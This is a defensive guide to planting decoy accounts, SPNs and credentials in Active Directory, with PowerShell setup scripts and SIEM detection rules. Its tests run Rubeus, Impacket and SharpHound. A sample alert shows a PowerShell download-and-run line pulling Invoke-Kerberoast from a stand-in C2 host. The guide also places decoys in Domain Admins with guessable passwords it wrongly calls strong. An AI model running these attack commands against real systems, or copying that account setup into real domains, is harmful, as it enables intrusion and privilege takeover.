---
name: deploying-ad-honeytokens-for-detection
description: >-
  Deploys decoy accounts, SPNs, and credentials in Active Directory to detect
  reconnaissance, Kerberoasting, credential theft, and lateral movement attempts.
  Honeytokens have no legitimate use; any access triggers high-confidence alerts
  for SIEM and EDR. Use when implementing deception-based detection, hardening AD
  against post-exploitation, detecting DCSync/Golden Ticket attacks, or augmenting
  ITDR (Identity Threat Detection and Response) capabilities. Covers deployment of
  decoy user accounts with high-privilege attributes, fake SPNs vulnerable to
  Kerberoasting, Group Policy honeypot objects, and SIEM correlation rules for
  Event IDs 4768, 4769, 4776. Mapped to MITRE ATT&CK T1003 (Credential Dumping),
  T1558 (Kerberoasting), and MITRE D3FEND D3-DUC (Decoy User Credential).
domain: cybersecurity
subdomain: deception-technology
tags:
- active-directory
- honeytokens
- deception
- kerberoasting
- credential-theft
- lateral-movement
- itdr
- decoy-accounts
- spn
- siem
version: "1.0"
author: dakshverma23
license: Apache-2.0
nist_csf:
- DE.CM-01
- DE.AE-02
- DE.DP-04
mitre_attack:
- T1003
- T1558
- T1558.003
mitre_d3fend:
- D3-DUC
- D3-DACH
---

# Deploying Active Directory Honeytokens for Detection

## When to Use

- When implementing **deception-based detection** to catch attackers performing AD reconnaissance, credential theft, or lateral movement
- When **hardening Active Directory** security posture and seeking high-fidelity alerts (no false positives)
- After **penetration test findings** showing AD enumeration (BloodHound, SharpHound) or Kerberoasting attacks went undetected
- When deploying **ITDR (Identity Threat Detection and Response)** solutions like Microsoft Defender for Identity, SentinelOne Singularity Identity
- When **augmenting SIEM** with behavioral indicators beyond traditional log analysis (no legitimate user should touch honeytokens)
- During **incident response** to detect if attacker maintains persistence or continues reconnaissance
- When **legacy AD environments** lack modern EDR but have log aggregation (honeytokens work with Event Viewer + Splunk/ELK)

**Do not use** as sole security control (honeytokens are detection, not prevention); layer with PAM, LAPS, credential rotation, and Tier 0 segmentation.

## Prerequisites

- **Domain Admin** or equivalent privileges to create users, modify SPNs, set ACLs
- Access to **Active Directory Users and Computers** (ADUC) or PowerShell RSAT cmdlets
- **SIEM or log aggregation** platform (Splunk, Microsoft Sentinel, ELK, Graylog) consuming Windows Security Event Logs
- **Domain Controllers** configured to forward Event IDs 4768 (Kerberos TGT Request), 4769 (Kerberos Service Ticket), 4776 (NTLM auth)
- Knowledge of **Kerberoasting attack vectors** (SPNs, GetUserSPNs.py, Rubeus)
- Understanding of **AD tiering model** (knowing where to place honeytokens for max attacker contact)
- **Naming convention** for honeytokens that appear legitimate (avoid "honeytoken", "decoy", "test")

## Workflow

### Phase 1: Design Honeytoken Strategy

Plan decoy placement to maximize attacker interaction:

**Honeytoken Types**:
1. **Decoy User Accounts**: Fake users with enticing attributes (e.g., "SQL-Admin", "Backup-Admin", "VPN-Service")
2. **Decoy SPNs**: Service Principal Names configured on decoy accounts to attract Kerberoasting
3. **Decoy Credentials**: Fake credentials planted in scripts, config files, password managers
4. **Decoy Group Memberships**: Honeytokens added to Domain Admins, Enterprise Admins (never used legitimately)
5. **Decoy ACLs**: Fake GenericAll/WriteDacl permissions visible to BloodHound queries
6. **Decoy GPOs**: Group Policy Objects that should never be accessed

**Naming Strategy** (appear legitimate to attackers):
```
GOOD Names (blend in):
  - svc-sql-backup
  - adm-helpdesk-tier2
  - sqlserver-prodreader
  - vmware-vcenter-svc
  - backup-admin-primary

BAD Names (obvious decoys):
  - honeytoken-user
  - decoy-admin
  - fake-service-account
  - test-honeypot
```

**Placement Strategy**:
- Place in OUs attackers enumerate (Service Accounts OU, Admin Accounts OU)
- Assign to security groups visible in `net group "Domain Admins"` output
- Set descriptions that attract attention: "High-privilege backup account - DO NOT DISABLE"



### Phase 2: Create Decoy User Accounts

Deploy honeytoken accounts with PowerShell:

```powershell
# Create decoy service account with SPN (Kerberoasting bait)
New-ADUser -Name "svc-sql-backup" `
           -SamAccountName "svc-sql-backup" `
           -UserPrincipalName "svc-sql-backup@corp.local" `
           -Description "SQL Server backup service account - DO NOT MODIFY" `
           -Enabled $true `
           -PasswordNeverExpires $true `
           -AccountPassword (ConvertTo-SecureString "NeverUsedPassword123!" -AsPlainText -Force) `
           -Path "OU=Service Accounts,DC=corp,DC=local"

# Set SPN (makes account Kerberoastable)
Set-ADUser -Identity "svc-sql-backup" -ServicePrincipalNames @{Add="MSSQLSvc/sql-backup.corp.local:1433"}

# Create decoy admin account
New-ADUser -Name "adm-tier1-backup" `
           -SamAccountName "adm-tier1-backup" `
           -UserPrincipalName "adm-tier1-backup@corp.local" `
           -Description "Tier 1 backup administrator account" `
           -Enabled $true `
           -PasswordNeverExpires $true `
           -AccountPassword (ConvertTo-SecureString "NeverUsedPassword456!" -AsPlainText -Force) `
           -Path "OU=Admin Accounts,DC=corp,DC=local"

# Add to high-privilege group (will trigger alert if enumerated)
Add-ADGroupMember -Identity "Domain Admins" -Members "adm-tier1-backup"

# Set account to NEVER be used (flag for monitoring)
Set-ADUser -Identity "adm-tier1-backup" -Description "HONEYTOKEN:DO_NOT_USE - Tier 1 backup administrator"
```

**Key Attributes**:
- `PasswordNeverExpires = $true`: Prevents lockout from failed login attempts
- `Enabled = $true`: Account must be active to appear in enumeration
- Strong password: Prevents accidental compromise via password spray
- SPN configured: Makes account vulnerable to Kerberoasting

**Batch Deployment Script**:
```powershell
# deploy_honeytokens.ps1
$Honeytokens = @(
    @{Name="svc-sql-backup"; SPN="MSSQLSvc/sql-backup.corp.local:1433"; Description="SQL Server backup service"},
    @{Name="svc-vmware-mgmt"; SPN="HTTP/vmware-mgmt.corp.local"; Description="VMware management service"},
    @{Name="svc-backup-exec"; SPN="BackupExec/backup.corp.local"; Description="Backup Exec service account"},
    @{Name="adm-helpdesk-tier2"; SPN=$null; Description="Tier 2 helpdesk administrator"},
    @{Name="sqlserver-readonly"; SPN="MSSQLSvc/sqlserver-ro.corp.local:1433"; Description="SQL read-only service"}
)

foreach ($Token in $Honeytokens) {
    Write-Host "Creating honeytoken: $($Token.Name)"
    
    # Create user
    New-ADUser -Name $Token.Name `
               -SamAccountName $Token.Name `
               -UserPrincipalName "$($Token.Name)@corp.local" `
               -Description $Token.Description `
               -Enabled $true `
               -PasswordNeverExpires $true `
               -AccountPassword (ConvertTo-SecureString "HoneytokenP@ss$(Get-Random -Minimum 1000 -Maximum 9999)!" -AsPlainText -Force) `
               -Path "OU=Service Accounts,DC=corp,DC=local"
    
    # Set SPN if specified
    if ($Token.SPN) {
        Set-ADUser -Identity $Token.Name -ServicePrincipalNames @{Add=$Token.SPN}
        Write-Host "  Set SPN: $($Token.SPN)"
    }
    
    # Add to Domain Admins (optional - high visibility)
    # Add-ADGroupMember -Identity "Domain Admins" -Members $Token.Name
    
    Write-Host "  ✓ Created: $($Token.Name)"
}

Write-Host "`nDeployed $($Honeytokens.Count) honeytokens"
```

### Phase 3: Configure SIEM Alerting

Create detection rules for honeytoken access:

**Event IDs to Monitor**:
- **4768**: Kerberos TGT Request (initial authentication)
- **4769**: Kerberos Service Ticket Request (Kerberoasting detection)
- **4776**: NTLM authentication (legacy auth attempt)
- **4624**: Successful logon (honeytoken should NEVER log in)
- **4625**: Failed logon (password spray detection)
- **4662**: Operation performed on object (LDAP enumeration)

**Splunk Detection Rule**:
```spl
index=wineventlog sourcetype=WinEventLog:Security
(EventCode=4768 OR EventCode=4769 OR EventCode=4776 OR EventCode=4624)
(TargetUserName="svc-sql-backup" OR TargetUserName="adm-tier1-backup" OR TargetUserName="svc-vmware-mgmt" OR TargetUserName="svc-backup-exec" OR TargetUserName="sqlserver-readonly")
| eval severity="critical"
| eval alert_message="🚨 HONEYTOKEN ACCESS DETECTED - Potential Kerberoasting or Credential Theft"
| table _time, EventCode, TargetUserName, IpAddress, WorkstationName, SourceNetworkAddress
| sendalert email to="security-team@corp.local"
```

**Microsoft Sentinel (KQL) Detection Rule**:
```kql
SecurityEvent
| where EventID in (4768, 4769, 4776, 4624)
| where TargetUserName in ("svc-sql-backup", "adm-tier1-backup", "svc-vmware-mgmt", "svc-backup-exec", "sqlserver-readonly")
| extend AlertSeverity = "High"
| extend AlertTitle = strcat("Honeytoken Access: ", TargetUserName, " from ", IpAddress)
| project TimeGenerated, EventID, TargetUserName, IpAddress, WorkstationName, Computer
```

**ELK / OpenSearch Rule**:
```json
{
  "query": {
    "bool": {
      "must": [
        {
          "terms": {
            "event.code": ["4768", "4769", "4776", "4624"]
          }
        },
        {
          "terms": {
            "winlog.event_data.TargetUserName.keyword": [
              "svc-sql-backup",
              "adm-tier1-backup",
              "svc-vmware-mgmt",
              "svc-backup-exec",
              "sqlserver-readonly"
            ]
          }
        }
      ]
    }
  },
  "actions": {
    "email_security_team": {
      "email": {
        "to": ["security-team@corp.local"],
        "subject": "🚨 Honeytoken Access Detected",
        "body": "Honeytoken {{ctx.payload.hits.hits.0._source.winlog.event_data.TargetUserName}} accessed from {{ctx.payload.hits.hits.0._source.source.ip}}"
      }
    }
  }
}
```

**Graylog Stream Rule**:
```
Field: EventID
Type: match regular expression
Value: ^(4768|4769|4776|4624)$

AND

Field: TargetUserName
Type: match regular expression
Value: ^(svc-sql-backup|adm-tier1-backup|svc-vmware-mgmt|svc-backup-exec|sqlserver-readonly)$
```

### Phase 4: Detect Kerberoasting Attacks

Monitor for TGS-REQ requests targeting honeytoken SPNs:

**Kerberoasting Indicator** (Event ID 4769):
```
Event ID: 4769 (Kerberos Service Ticket Request)
Service Name: MSSQLSvc/sql-backup.corp.local  ← Honeytoken SPN
Ticket Encryption Type: 0x17 (RC4-HMAC)      ← Weak encryption = Kerberoasting
Account Name: attacker-workstation$
```

**Detection Logic**:
1. Event 4769 for honeytoken SPN
2. Ticket encryption type = 0x17 (RC4) or 0x12 (AES256) with SPN in honeytoken list
3. Source workstation is NOT a legitimate admin workstation

**Enhanced Splunk Detection**:
```spl
index=wineventlog sourcetype=WinEventLog:Security EventCode=4769
ServiceName="MSSQLSvc/sql-backup.corp.local" OR ServiceName="HTTP/vmware-mgmt.corp.local" OR ServiceName="MSSQLSvc/sqlserver-ro.corp.local"
| eval is_kerberoasting=if(TicketEncryptionType="0x17", "YES", "NO")
| where is_kerberoasting="YES"
| stats count by _time, ServiceName, IpAddress, WorkstationName, TicketEncryptionType
| where count > 0
| eval alert="🚨 KERBEROASTING DETECTED - Honeytoken SPN Requested with RC4 Encryption"
| sendalert pagerduty priority="critical"
```

**Microsoft Defender for Identity Integration**:
- MDI automatically flags Kerberoasting attempts against accounts with SPNs
- Honeytokens generate alerts with "Service account queried with unusual encryption" or "Suspected Kerberos SPN exposure"
- Configure MDI to treat ANY access to honeytoken accounts as critical severity

### Phase 5: Deploy Decoy Credentials

Plant fake credentials in common attacker discovery locations:

**1. Fake credentials in PowerShell history**:
```powershell
# Append to PowerShell history file
$HistoryFile = (Get-PSReadlineOption).HistorySavePath
Add-Content -Path $HistoryFile -Value '$cred = Get-Credential -UserName "svc-sql-backup" -Message "SQL Backup"'
Add-Content -Path $HistoryFile -Value '$pass = ConvertTo-SecureString "NeverUsedPassword123!" -AsPlainText -Force'
```

**2. Fake credentials in Group Policy Preferences** (classic attack vector):
```xml
<!-- Deploy via GPO to select OUs -->
<!-- C:\Windows\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml -->
<Groups>
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="svc-sql-backup" image="2">
    <Properties action="U" newName="" fullName="" description="SQL Backup Service" 
                cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" 
                userName="svc-sql-backup"/>
  </User>
</Groups>
<!-- Attackers will decrypt cpassword and attempt to use credentials -->
```

**3. Fake credentials in web.config / app.config files**:
```xml
<!-- Place in IIS application directory -->
<configuration>
  <connectionStrings>
    <add name="Backup" 
         connectionString="Server=sql-backup.corp.local;Database=Backup;User ID=svc-sql-backup;Password=NeverUsedPassword123!;" 
         providerName="System.Data.SqlClient"/>
  </connectionStrings>
</configuration>
```

**4. Fake credentials in scripts**:
```powershell
# C:\Scripts\backup.ps1
# Backup script (DO NOT DELETE)
$username = "corp\svc-sql-backup"
$password = ConvertTo-SecureString "NeverUsedPassword123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)

# Rest of script...
```

**Detection**: Monitor for authentication attempts using these credentials from unexpected sources.

### Phase 6: Implement ACL Honeypots

Create fake permissions that appear in BloodHound graphs:

**Scenario**: Attacker runs BloodHound, sees honeytoken account has GenericAll on Domain Admins group

```powershell
# Grant honeytoken account GenericAll on Domain Admins (NEVER use legitimately)
$Identity = Get-ADUser "svc-sql-backup"
$Target = Get-ADGroup "Domain Admins"

$ACL = Get-ACL "AD:$($Target.DistinguishedName)"
$SID = [System.Security.Principal.SecurityIdentifier]$Identity.SID

$Rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $SID,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow
)

$ACL.AddAccessRule($Rule)
Set-ACL -Path "AD:$($Target.DistinguishedName)" -AclObject $ACL

Write-Host "✓ Honeytoken svc-sql-backup now has GenericAll on Domain Admins (TRAP SET)"
```

**Detection**: Monitor Event ID 4662 (object access) for operations on Domain Admins group by honeytoken account.

```spl
index=wineventlog sourcetype=WinEventLog:Security EventCode=4662
ObjectName="CN=Domain Admins,CN=Users,DC=corp,DC=local"
SubjectUserName="svc-sql-backup"
| eval alert="🚨 HONEYTOKEN PRIVILEGE ESCALATION ATTEMPT"
```

### Phase 7: Monitor for DCSync and Golden Ticket Attacks

Detect replication requests from honeytoken accounts:

**DCSync Detection** (Event ID 4662):
```
Object Type: domain
Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes)
             {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes-All)
Subject: svc-sql-backup
```

**Detection Rule**:
```spl
index=wineventlog sourcetype=WinEventLog:Security EventCode=4662
ObjectType="domain"
Properties IN ("*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*", "*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*")
(SubjectUserName="svc-sql-backup" OR SubjectUserName="adm-tier1-backup" OR SubjectUserName="svc-vmware-mgmt")
| eval alert="🚨 DCSYNC ATTACK DETECTED - Honeytoken Requesting AD Replication"
| sendalert pagerduty priority="critical"
```

**Golden Ticket Detection**:
- Monitor for TGT requests (Event 4768) for honeytoken accounts with unusual ticket lifetimes (10 years)
- Alert on TGT requests from workstations not in "Admin Workstations" group

### Phase 8: Test Honeytoken Effectiveness

Validate detection with simulated attacks:

**Test 1: Kerberoasting**:
```powershell
# From attacker workstation (or test VM)
# Use Rubeus or Impacket

# Rubeus (Windows)
.\Rubeus.exe kerberoast /user:svc-sql-backup /nowrap

# Impacket GetUserSPNs.py (Linux)
python3 GetUserSPNs.py -request -dc-ip 10.0.1.5 corp.local/normaluser:password
```

**Expected Result**: Alert triggered within seconds showing Event 4769 for honeytoken SPN.

**Test 2: Credential Usage**:
```powershell
# Attempt authentication with honeytoken credentials
$cred = Get-Credential -UserName "svc-sql-backup"
# Enter password: NeverUsedPassword123!

Test-Connection -ComputerName dc01.corp.local -Credential $cred
```

**Expected Result**: Alert triggered on Event 4776 (NTLM) or 4768 (Kerberos TGT).

**Test 3: BloodHound Enumeration**:
```powershell
# Run SharpHound collector
.\SharpHound.exe -c All --zipfilename bloodhound_test.zip

# Import into BloodHound and search for:
# - Shortest path to Domain Admins from honeytoken accounts
# - Accounts with SPNs (svc-sql-backup should appear)
```

**Expected Result**: Honeytoken accounts visible in graph; any attempt to leverage them triggers alert.

**Test 4: LDAP Enumeration**:
```powershell
# Enumerate Domain Admins group
net group "Domain Admins" /domain

# Or with PowerView
Get-NetGroupMember -GroupName "Domain Admins"
```

**Expected Result**: Honeytoken account "adm-tier1-backup" appears in results. Accessing it triggers Event 4662.

## Key Concepts

| Term | Definition |
|------|------------|
| **Honeytoken** | Decoy credential, account, or object with no legitimate use; any access indicates compromise |
| **Kerberoasting** | Attack extracting Kerberos service tickets (TGS) for accounts with SPNs, cracking offline to obtain plaintext passwords |
| **SPN (Service Principal Name)** | Identifier linking service instance to AD account; required for Kerberos authentication; makes account Kerberoastable |
| **DCSync** | Attack simulating domain controller replication to extract password hashes (NTLM, Kerberos keys) for all domain users |
| **Golden Ticket** | Forged Kerberos TGT using compromised krbtgt account hash, granting unlimited domain access with arbitrary privileges |
| **ITDR (Identity Threat Detection & Response)** | Security category focused on detecting identity-based attacks (Kerberoasting, DCSync, lateral movement) in AD/Entra ID |
| **BloodHound** | Graph-based AD reconnaissance tool mapping attack paths to Domain Admins by analyzing ACLs, group memberships, and trusts |
| **Event ID 4768** | Kerberos TGT Request (initial authentication); logged on DC when user/service requests Ticket Granting Ticket |
| **Event ID 4769** | Kerberos Service Ticket Request; logged when TGS requested for SPN (Kerberoasting generates this for target SPNs) |
| **Deception Technology** | Security approach using decoys (honeypots, honeytokens, honey credentials) to detect attackers with high confidence |

## Tools & Systems

- **Microsoft Defender for Identity (MDI)**: Cloud-based ITDR detecting Kerberoasting, DCSync, Golden Ticket, Pass-the-Hash; automatic honeytoken integration
- **SentinelOne Singularity Identity**: Autonomous ITDR with real-time AD query monitoring and automated honeytoken deployment
- **Cayosoft Guardian**: AD security platform with built-in Kerberoasting detection via honeytoken SPNs
- **Splunk Enterprise Security**: SIEM with AD monitoring; custom correlation rules detect honeytoken access patterns
- **Microsoft Sentinel**: Cloud-native SIEM consuming Windows Security Events; KQL queries detect honeytoken triggers
- **BloodHound**: AD attack path analyzer; used by attackers but also defenders to verify honeytoken visibility
- **Rubeus**: C# Kerberos abuse toolkit; used to test Kerberoasting detection against honeytoken SPNs
- **Impacket**: Python toolkit for SMB/Kerberos attacks; GetUserSPNs.py extracts SPNs (including honeytokens)
- **CyberArk EPM / BeyondTrust**: PAM solutions with honeytoken integration for privileged account monitoring

## Common Scenarios

### Scenario: Detecting Post-Exploitation Reconnaissance After Phishing

**Context**: Employee falls victim to phishing attack, attacker gains initial foothold on workstation with standard user privileges. Attacker runs BloodHound/SharpHound to map AD, discovers service account "svc-sql-backup" with SPN and "interesting" description. Attacker performs Kerberoasting using Rubeus, extracts TGS for honeytoken account. Within 30 seconds, SOC receives critical alert from SIEM.

**Approach**:
1. **Detection**: SIEM alert fires on Event 4769 (TGS Request) for honeytoken SPN from compromised workstation
2. **Validation**: Verify no legitimate process requested this SPN; check if workstation is admin-authorized
3. **Containment**: Isolate compromised workstation via EDR; disable user account; reset password
4. **Investigation**: Review PowerShell logs, process execution (Sysmon Event ID 1), network connections for C2
5. **Forensics**: Extract Rubeus artifacts, check for credential dumping (Mimikatz, ProcDump on lsass.exe)
6. **Eradication**: Remove persistence (scheduled tasks, registry run keys, WMI subscriptions)
7. **Recovery**: Reimage workstation, credential rotation for exposed accounts, patch initial access vector

**Pitfalls**:
- Not isolating workstation immediately (attacker may detect honeytoken trigger and pivot quickly)
- Only rotating honeytoken password (attacker may have dumped other credentials; rotate all accounts user accessed)
- Not analyzing full attack chain (missing lateral movement to other systems)

---

### Scenario: Detecting Kerberoasting at Scale (Automated Attack)

**Context**: Attacker runs automated Kerberoasting script (Invoke-Kerberoast, GetUserSPNs.py) targeting ALL accounts with SPNs in domain. Script extracts 50+ TGS tickets including 3 honeytoken SPNs. SOC receives burst of alerts for honeytoken access within 2-minute window.

**Approach**:
1. **Detection**: Multiple Event 4769 alerts for honeytoken SPNs from same source IP/workstation
2. **Correlation**: SIEM correlates 3 honeytoken triggers + 47 legitimate SPN requests = mass Kerberoasting
3. **Priority Escalation**: Automated playbook escalates to Tier 2 analyst (high confidence attack)
4. **Threat Hunting**: Identify ALL SPNs requested in attack window; correlate with EDR process execution
5. **Credential Rotation**: Rotate passwords for ALL accounts with SPNs requested (not just honeytokens)
6. **Hardening**: Disable RC4 encryption for Kerberos (force AES256); audit SPN assignments; remove unnecessary SPNs
7. **Detection Enhancement**: Deploy additional honeytokens with diverse SPN types (HTTP, MSSQL, LDAP, CIFS)

**Pitfalls**:
- Focusing only on honeytokens while attacker cracks legitimate service account passwords
- Not disabling RC4 encryption (allows offline cracking with hashcat/John)
- Failing to audit SPN assignments (over-permissioned accounts with SPNs)

## Output Format

```
AD HONEYTOKEN DETECTION ALERT
==============================
Alert ID:       SOC-2026-07-15-0042
Timestamp:      2026-07-15 14:23:17 UTC
Severity:       CRITICAL
Confidence:     HIGH (Honeytoken Access = No False Positives)

HONEYTOKEN ACCESSED
━━━━━━━━━━━━━━━━━━━
Account:        svc-sql-backup
SPN:            MSSQLSvc/sql-backup.corp.local:1433
Attack Type:    Kerberoasting (TGS Request with RC4 Encryption)

SOURCE DETAILS
━━━━━━━━━━━━━━
Workstation:    WKS-MARKETING-042
IP Address:     10.2.45.78
User Context:   CORP\jdoe
Process:        powershell.exe (PID 3842)
Command Line:   powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.99/Invoke-Kerberoast.ps1')"

EVENT DETAILS
━━━━━━━━━━━━━
Event ID:       4769 (Kerberos Service Ticket Request)
Domain Controller: DC01.corp.local
Ticket Encryption: 0x17 (RC4-HMAC-MD5)
Ticket Options: 0x40810000 (Forwardable, Renewable)

TIMELINE
━━━━━━━━
14:20:15  User jdoe logs into WKS-MARKETING-042
14:22:45  PowerShell execution: Invoke-Kerberoast.ps1 downloaded from 192.168.1.99
14:23:12  TGS requests for 50 SPNs (including 3 honeytokens)
14:23:17  🚨 ALERT TRIGGERED (Honeytoken svc-sql-backup accessed)

RECOMMENDED ACTIONS
━━━━━━━━━━━━━━━━━━━
1. [IMMEDIATE] Isolate WKS-MARKETING-042 via EDR
2. [IMMEDIATE] Disable user account CORP\jdoe
3. [URGENT] Rotate passwords for all SPNs requested in attack (see attached list)
4. [URGENT] Check for lateral movement from WKS-MARKETING-042 (RDP, WMI, PsExec)
5. [24 HOURS] Forensic analysis: memory dump, disk imaging, timeline reconstruction
6. [48 HOURS] Disable RC4 encryption domain-wide (force AES256)
7. [1 WEEK] Audit all SPN assignments; remove unnecessary SPNs

ARTIFACTS
━━━━━━━━━
- Kerberos TGS tickets extracted: 50 (including 3 honeytokens)
- C2 IP identified: 192.168.1.99 (external IP, ISP: Suspicious Hosting Inc.)
- Malicious script: Invoke-Kerberoast.ps1 (SHA256: abc123def456...)
- PowerShell logs: Exported to \\SOC\Evidence\2026-07-15\Case-0042\

IOCS
━━━━
C2 IP:          192.168.1.99
C2 Domain:      attacker-c2.evil.com
Script Hash:    abc123def456789...
User Agent:     PowerShell/5.1.19041.1

MITRE ATT&CK MAPPING
━━━━━━━━━━━━━━━━━━━
T1558.003       Steal or Forge Kerberos Tickets: Kerberoasting
T1087.002       Account Discovery: Domain Account
T1069.002       Permission Groups Discovery: Domain Groups

ANALYST NOTES
━━━━━━━━━━━━━
High-confidence alert - honeytoken access indicates active compromise.
User jdoe has NO legitimate reason to request TGS for svc-sql-backup.
Recommend immediate containment and forensic investigation.

Status: ESCALATED TO INCIDENT RESPONSE TEAM
Assigned: IR-Lead-Alice
```

## Verification Checklist

- [ ] Honeytoken accounts created with realistic names (not "test", "decoy", "honey")
- [ ] SPNs configured on honeytoken accounts (makes them Kerberoastable)
- [ ] Passwords set to complex values (prevent accidental compromise)
- [ ] `PasswordNeverExpires` enabled (prevents lockout from failed attempts)
- [ ] Accounts added to high-privilege groups (Domain Admins, Enterprise Admins)
- [ ] SIEM rules configured for Event IDs 4768, 4769, 4776, 4624, 4662
- [ ] Alert severity set to CRITICAL (no false positives expected)
- [ ] SOC runbook created for honeytoken alert response
- [ ] Test Kerberoasting performed; alert validated within 60 seconds
- [ ] BloodHound graph verified; honeytokens visible in attack paths
- [ ] Decoy credentials planted in scripts, GPP, config files
- [ ] ACL honeypots configured (GenericAll on sensitive groups)
- [ ] DCSync detection enabled (Event 4662 replication requests)
- [ ] Monthly honeytoken audit scheduled (verify still deployed, not disabled)
- [ ] Honeytoken account list documented and secured (access restricted to SOC)

